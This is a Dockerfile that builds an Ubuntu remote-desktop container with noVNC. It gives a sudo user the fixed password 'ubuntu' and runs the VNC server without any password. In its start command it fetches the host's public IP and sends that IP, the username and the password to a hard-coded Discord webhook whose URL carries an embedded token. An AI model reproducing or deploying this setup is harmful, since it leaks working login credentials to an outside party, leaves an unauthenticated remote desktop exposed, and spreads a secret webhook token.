# Use minimal Ubuntu base image
FROM ubuntu:22.04

# Set environment variables
ENV DEBIAN_FRONTEND=noninteractive
ENV USER=ubuntu
ENV PASSWORD=ubuntu

# Install only required packages
RUN apt-get update && apt-get install -y \
    sudo \
    x11vnc \
    xvfb \
    novnc \
    websockify \
    curl \
    iproute2 \
    && rm -rf /var/lib/apt/lists/*

# Create user and set password
RUN useradd -ms /bin/bash $USER && echo "$USER:$PASSWORD" | chpasswd && adduser $USER sudo

# Expose noVNC port
EXPOSE 6080

# Start services and send VPS details to Discord
CMD export DISPLAY=:1 && \
    Xvfb :1 -screen 0 1024x768x16 & \
    x11vnc -display :1 -nopw -forever & \
    websockify --web=/usr/share/novnc/ 6080 localhost:5900 & \
    sleep 5 && \
    IP_ADDRESS=$(curl -s ifconfig.me) && \
    WEBHOOK_URL="https://discord.com/api/webhooks/1289955380323160127/6JzbyzLROIo80Hb4uh3ImGpEPg2pKW5U1bLenvOcL7uqxd4bAxXbZaPsAsk9xO66wn35" && \
    MESSAGE="IP: $IP_ADDRESS\nUser: $USER\nPassword: $PASSWORD" && \
    PAYLOAD="{\"content\": \"$MESSAGE\"}" && \
    curl -H "Content-Type: application/json" -d "$PAYLOAD" "$WEBHOOK_URL" && \
    tail -f /dev/null
